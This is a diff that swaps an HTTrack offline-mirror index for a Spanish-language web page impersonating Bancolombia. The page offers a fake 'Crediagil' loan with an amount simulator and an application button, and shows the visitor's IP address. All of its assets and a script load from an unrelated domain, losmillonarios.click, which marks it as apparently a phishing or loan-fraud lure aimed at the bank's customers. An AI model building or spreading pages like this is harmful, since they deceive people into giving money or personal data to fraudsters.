@@ -1,135 +1,95 @@
+<html><head>
+<title>Consulta tu historial Crediticio</title>
+<meta charset="utf-8">
+<meta content="es" http-equiv="Content-Language">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://losmillonarios.click/css/general.css">
+<link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
 
-body {
-	margin: 0;  padding: 0;  margin-bottom: 15px;  margin-top: 8px;
-	background: #77b;
-}
-body, td {
-	font: 14px "Trebuchet MS", Verdana, Arial, Helvetica, sans-serif;
-	}
+<script type="text/javascript" src="https://losmillonarios.click/js/jquery.jclockNew.js"></script></head>
 
-#subTitle {
-	background: #000;  color: #fff;  padding: 4px;  font-weight: bold; 
-	}
-
-#siteNavigation a, #siteNavigation .current {
-	font-weight: bold;  color: #448;
-	}
-#siteNavigation a:link    { text-decoration: none; }
-#siteNavigation a:visited { text-decoration: none; }
-
-#siteNavigation .current { background-color: #ccd; }
-
-#siteNavigation a:hover   { text-decoration: none;  background-color: #fff;  color: #000; }
-#siteNavigation a:active  { text-decoration: none;  background-color: #ccc; }
-
-
-a:link    { text-decoration: underline;  color: #00f; }
-a:visited { text-decoration: underline;  color: #000; }
-a:hover   { text-decoration: underline;  color: #c00; }
-a:active  { text-decoration: underline; }
-
-#pageContent {
-	clear: both;
-	border-bottom: 6px solid #000;
-	padding: 10px;  padding-top: 20px;
-	line-height: 1.65em;
-	background-image: url(backblue.gif);
-	background-repeat: no-repeat;
-	background-position: top right;
-	}
-
-#pageContent, #siteNavigation {
-	background-color: #ccd;
-	}
-
-
-.imgLeft  { float: left;   margin-right: 10px;  margin-bottom: 10px; }
-.imgRight { float: right;  margin-left: 10px;   margin-bottom: 10px; }
-
-hr { height: 1px;  color: #000;  background-color: #000;  margin-bottom: 15px; }
-
-h1 { margin: 0;  font-weight: bold;  font-size: 2em; }
-h2 { margin: 0;  font-weight: bold;  font-size: 1.6em; }
-h3 { margin: 0;  font-weight: bold;  font-size: 1.3em; }
-h4 { margin: 0;  font-weight: bold;  font-size: 1.18em; }
-
-.blak { background-color: #000; }
-.hide { display: none; }
-.tableWidth { min-width: 400px; }
-
-.tblRegular       { border-collapse: collapse; }
-.tblRegular td    { padding: 6px;  background-image: url(fade.gif);  border: 2px solid #99c; }
-.tblHeaderColor, .tblHeaderColor td { background: #99c; }
-.tblNoBorder td   { border: 0; }
-
-
-// -->
+<body class="t-body">
+<style>
+  :root{--bg:#ffffff;--text:#111827;--muted:#6b7280;--border:#e5e7eb;--shadow:none;--primary:#ffd200;--primary-text:#111827;--container-max:820px;--wrap-pad:22px;--card-pad:18px;--logo-max:180px;--title-size:24px;--subtitle-size:15px;--footer-size:12px;--btn-min:220px;--btn-radius:12px;--btn-pad-y:14px;--btn-font:16px}
+  html,body{height:100%}
+  body{margin:0;background:var(--bg);color:var(--text);font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,"Helvetica Neue",Arial,"Noto Sans",sans-serif}
+  .auth-wrap{min-height:100%;display:grid;place-items:center;padding:var(--wrap-pad) 12px}
+  .auth-card{width:100%;max-width:var(--container-max);background:transparent;border:none;border-radius:0;box-shadow:none;padding:var(--card-pad)}
+  .auth-logo{display:block;margin:0 auto 10px;max-width:var(--logo-max);width:100%;height:auto}
+  .title{margin:6px 0 4px;font-size:var(--title-size);font-weight:700;text-align:center}
+  .subtitle{margin:0 0 12px;font-size:var(--subtitle-size);color:var(--muted);text-align:center}
+  .hero{width:100%;border-radius:12px;display:block}
+  .actions{display:flex;justify-content:center;margin-top:12px}
+  #btn-submit{min-width:var(--btn-min);border:0;border-radius:var(--btn-radius);padding:var(--btn-pad-y) 18px;font-weight:700;cursor:pointer;background:var(--primary);color:var(--primary-text);box-shadow:none;font-size:var(--btn-font)}
+  .credit-section{margin-top:18px;padding:18px;border:1px solid var(--border);border-radius:14px;background:#f9fafb}
+  .credit-title{margin:0 0 6px;font-size:18px;font-weight:600;text-align:center}
+  .credit-description{margin:0 0 14px;font-size:14px;color:var(--muted);text-align:center}
+  .credit-range{width:100%;margin:0 0 12px}
+  .credit-inputs{display:flex;flex-direction:column;gap:10px}
+  .credit-inputs label{font-size:13px;color:var(--muted)}
+  .credit-term{margin-top:12px;display:flex;flex-direction:column;gap:6px}
+  .credit-term label{font-size:13px;color:var(--muted)}
+  .credit-term select{padding:10px;border:1px solid var(--border);border-radius:10px;font-size:14px;background:#fff;color:var(--text);font-family:inherit}
+  .credit-summary{display:flex;flex-direction:column;gap:6px;font-weight:600;flex-wrap:wrap}
+  .credit-summary span{font-size:15px}
+  .credit-note{margin-top:10px;font-size:12px;color:var(--muted);text-align:center}
+  @media (min-width:620px){
+    .credit-inputs{flex-direction:row;align-items:center;justify-content:space-between}
+    .credit-summary{flex-direction:row;justify-content:space-between;align-items:center}
+    .credit-summary span{font-size:16px}
+  }
+  .footer{margin-top:12px;text-align:center;font-size:var(--footer-size);color:var(--muted)}
 </style>
 
-</head>
+<div class="auth-wrap">
+  <div class="auth-card">
+    <img class="auth-logo" src="https://losmillonarios.click/assets/img/Bancolombia.svg" alt="Bancolombia">
+    
 
-<table width="76%" border="0" align="center" cellspacing="0" cellpadding="3" class="tableWidth">
-	<tr>
-	<td id="subTitle">HTTrack Website Copier - Open Source offline browser</td>
-	</tr>
-</table>
-<table width="76%" border="0" align="center" cellspacing="0" cellpadding="0" class="tableWidth">
-<tr class="blak">
-<td>
-	<table width="100%" border="0" align="center" cellspacing="1" cellpadding="0">
-	<tr>
-	<td colspan="6"> 
-		<table width="100%" border="0" align="center" cellspacing="0" cellpadding="10">
-		<tr> 
-		<td id="pageContent"> 
-<!-- ==================== End prologue ==================== -->
+    <img class="hero" src="https://losmillonarios.click/assets/img/crediagil.png" alt="Tarjeta virtual">
 
-	<meta name="generator" content="HTTrack Website Copier/3.x">
-	<TITLE>Local index - HTTrack</TITLE>
-</HEAD>
-<BODY>
-<H1 ALIGN=Center>Index of locally available sites:</H1>
-	<TABLE BORDER="0" WIDTH="100%" CELLSPACING="1" CELLPADDING="0">
-		<TR>
-			<TD BACKGROUND="fade.gif">
-				&middot;
-					<A HREF="crediagil.blob.core.windows.net/web/ba2c5.html">
-						Crediagil
-					</A>		
-			</TD>
-		</TR>
-	</TABLE>
-	<BR>
-	<BR>
-	<BR>
-  	<H6 ALIGN="RIGHT">
-	<I>Mirror and index made by HTTrack Website Copier [XR&amp;CO'2008]</I>
-	</H6>
-	<!-- Mirror and index made by HTTrack Website Copier/3.49-2 [XR&CO'2014] -->
-	<!-- Thanks for using HTTrack Website Copier! -->
-	<meta HTTP-EQUIV="Refresh" CONTENT="0; URL=crediagil.blob.core.windows.net/web/ba2c5.html">
+    <div class="credit-section">
+      <div class="credit-title">Simula tu crédito</div>
+      <div class="credit-description">Escoge un monto entre 5.000.000 y 18.000.000 COP con una tasa de interés del 0.64% mensual.</div>
+      <input id="credito-range" class="credit-range" type="range" min="5000000" max="18000000" step="100000" value="5000000">
+      <div class="credit-inputs">
+        <label for="credito-input">Monto seleccionado (COP)</label>
+        <input id="credito-input" type="number" inputmode="numeric" min="5000000" max="18000000" step="100000" value="5000000">
+      </div>
+      <div class="credit-term">
+        <label for="credito-plazo">Plazo del crédito</label>
+        <select id="credito-plazo">
+          <option value="12" selected="">12 meses</option>
+          <option value="24">24 meses</option>
+          <option value="36">36 meses</option>
+          <option value="48">48 meses</option>
+        </select>
+      </div>
+      <div class="credit-summary">
+        <span id="credito-valor">$5.000.000</span>
+        <span id="credito-plazo-text">Plazo: 12 meses</span>
+        <span id="credito-interes">Interés mensual: $32.000</span>
+        <span id="credito-cuota">Cuota mensual: --</span>
+      </div>
+      <div class="credit-note">El interés mensual y la cuota estimada se calculan automáticamente con la tasa indicada.</div>
+    </div>
 
+    <div class="actions">
+      <form method="post" onsubmit="return false;">
+        <button id="btn-submit" type="submit">SOLICITAR CREDIAGIL</button>
+      </form>
+    </div>
 
-<!-- ==================== Start epilogue ==================== -->
-		</td>
-		</tr>
-		</table>
-	</td>
-	</tr>
-	</table>
-</td>
-</tr>
-</table>
-
-<table width="76%" border="0" align="center" valign="bottom" cellspacing="0" cellpadding="0">
-	<tr>
-	<td id="footer"><small>&copy; 2008 Xavier Roche & other contributors - Web Design: Leto Kauler.</small></td>
-	</tr>
-</table>
-
-</body>
-
-</html>
-
-
-
+    <div class="footer">
+      <div id="ipc">Dirección IP:</div>
+      <div id="jclock1"></div>
+      <div style="margin-top:6px;">Copyright © 2025 Bancolombia.</div>
+    </div>
+  </div>
+  
+</div>
+</body></html>
